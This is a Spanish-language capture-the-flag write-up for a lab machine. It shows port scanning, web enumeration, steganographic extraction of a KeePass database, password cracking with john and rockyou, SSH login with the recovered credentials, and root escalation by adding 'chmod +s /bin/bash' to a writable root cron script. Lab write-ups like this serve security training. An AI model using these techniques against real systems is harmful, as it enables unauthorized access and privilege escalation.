# Fase 1- Tanteo
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/8d3966a2-e783-4f03-83de-aa8d08de46a8)
En esta fase inicial, realizamos un escaneo de puertos para identificar los servicios disponibles en la máquina objetivo. Utilizamos la herramienta Nmap con una serie de opciones para obtener información detallada y realizar un análisis exhaustivo de los puertos abiertos.

### Comando Nmap utilizado:

`sudo nmap -p- --open -sS -sC -sV --min-rate 5000 -vvv -n -Pn 192.168.52.139 -oN Escaneo`

### Detalles del Comando:

- `sudo nmap -p- --open -sS -sC -sV --min-rate 5000 -vvv -n -Pn 192.168.52.139 -oN Escaneo`
- `-p-`: Escaneo de todos los puertos.
- `--open`: Muestra solo puertos abiertos.
- `-sS`: Escaneo SYN para determinar el estado de los puertos.
- `-sC`: Activa detección de versiones y vulnerabilidades.
- `-sV`: Escaneo de versiones de servicios.
- `--min-rate 5000`: Velocidad mínima de escaneo.
- `-vvv`: Verbosidad muy alta para información detallada.
- `-n`: Desactiva la resolución de DNS.
- `-Pn`: Ignora la detección de hosts en línea.
- `192.168.52.139`: IP de la máquina objetivo.
- `-oN Escaneo`: Guarda resultados en archivo "Escaneo".

### Resultados:

#### Puertos Abiertos:

1. **22/tcp (SSH ):** OpenSSH 8.6p1
2.  **80/tcp (HTTP ):** Apache httpd 2.4.52

### Puerto 80
Al identificar que el puerto 80 estaba abierto durante el escaneo, se procedió a ingresar la dirección IP en el navegador. Y se encontró la pagina por defecto de Apache2 Debian.
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/d305bb93-d92f-4da2-8ba6-faa15fa4763d)

# Fase 2- Exploración

#### FeroxBuster
```python
-------------------------------------------------------------------------------
200      GET       22l      105w     5952c http://172.17.0.2/icons/ubuntu-logo.png
-------------------------------------------------------------------------------
200      GET      363l      961w    10671c http://172.17.0.2/
-------------------------------------------------------------------------------
200      GET      828l     4687w   413979c http://172.17.0.2/penguin.jpg
-------------------------------------------------------------------------------
200      GET       13l       31w      342c http://172.17.0.2/penguin.html
-------------------------------------------------------------------------------
```
Usando feroxbuster encontramos los directorios `/penguin.jpg` y `/penguin.html`.

#### /penguin.html
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/5e613943-c641-40f3-9c8e-9204887b5d9a)
Dentro de la pagina web hay una imagen de 2 pingüinos y un texto que nos dice que no hay nada interesante en la pagina del pingüino.

#### Penguin.jpg
Descargamos la imagen de los pingüinos y con la herramienta `stegseek`, le extraemos algunos datos.
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/024ab24f-b2c1-4c49-844c-32f604e2f6f3)

![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/d386e84e-86ce-4687-b1b7-6626a26e48fc)

Obtenemos un archivo `penguin.kdbx` con la pass `chocolate`

# Fase 3- Exploración

#### KeePass
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/4578bb0f-7cce-4b01-8d44-2ffea0257b0f)

No nos deja abrir el archivo con la contraseña proporcionada. Por lo que vamos a intentar crackearla. Lo primero es convertir el archivo `penguin.kdbx` en un hash. Con el comando
```python
keepass2john penguin.kdbx > hash
```

![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/a930a4b3-ee8c-4827-9121-7814e69f4f9a)

Con Jhon encontramos la contraseña. El comando es:
```python
john hash --wordlist=/usr/share/wordlists/rockyou.txt
```
La contraseña es password1.

![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/0ef5c38d-8c7d-4a3f-9621-063589e45f63)

Y entramos. Nos da el usuario `pinguino` y la contraseña `pinguinomaravilloso123`. Si probamos las credenciales: 
```python
sudo ssh pinguino@172.17.0.2
The authenticity of host '172.17.0.2 (172.17.0.2)' can't be established.
ED25519 key fingerprint is SHA256:fq/odrh/Uyh8YwZIuZ41PSOdwys9pR2KWH9WtPbE3fg.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '172.17.0.2' (ED25519) to the list of known hosts.
pinguino@172.17.0.2's password: 
Permission denied, please try again.
pinguino@172.17.0.2's password:
```
Nos tira error, pero si miramos bien, podemos ver otro usuario arriba a la izquierda en la imagen. El usuario `penguin`.
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/edebc1e7-30ff-46bc-a5e6-afaea0471c76)

Lo probamos y estamos dentro.

# Fase 4- Privilegios

#### sudo -l
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/7a98cdb1-b1f5-4e27-918c-8b7c8c0b8c06)

Despues de hacer el tratamiento de la TTY, no nos deja hacer el comando `sudo -l`, por ende utilizamos el comando`find / -perm -4000 -user root 2>/dev/null` para buscar que binarios tenemos para ejecutar como usuario `root`. No hay nada raro.

#### Buscar y buscar...
Al realizar un `ls` vi que en mi directorio había 2 archivos uno `.txt` y otro un script en bash `.sh`
Pero no había nada muy interesante.
```python
penguin@44698f69f3a3:~$ ls
archivo.txt  script.sh
penguin@44698f69f3a3:~$ cat archivo.txt 
pinguino no hackeable
penguin@44698f69f3a3:~$ cat script.sh 
#!/bin/bash

echo 'pinguino no hackeable' > archivo.txt
penguin@44698f69f3a3:~$ 
```

#### pspy64
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/3acfaf70-201c-4376-b152-9ce9b767f9b3)
Decidí en mi maquina atacante compartirle el programa `pspy64` que se utiliza para ver que procesos se están llevando acabo en el sistema. El comando que utilice fue `python3 -m http.server 80` para compartirme el archivo, y en la maquina victima utilice `wget 172.17.0.1/pspy64`.

![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/fe1810b3-1b20-4d7b-8a95-eaaaeb2b4f0b)
El resultado fue que se esta ejecutando muchas veces el archivo script.sh como el usuario root. Y como tenemos permisos de escribir ese archivo vamos a modificarlo.
Lo modificamos así: 
```shell
#!/bin/bash
chmod +s /bin/bash
echo 'pinguino no hackeable' > archivo.txt
```
Lo que hace está línea es otorgar permisos SUID a la `/bin/bash`, comprobamos que los tiene:
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/38a527b6-fe9d-42c2-8371-1a961a6433a1)

Una vez que la `/bin/bash` tiene permisos SUID, ejecutaremos `/bin/bash -p` y listo ya somos usuario `root`!.
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/a6db0cc6-5fe1-455f-9108-1a8f499082cc)


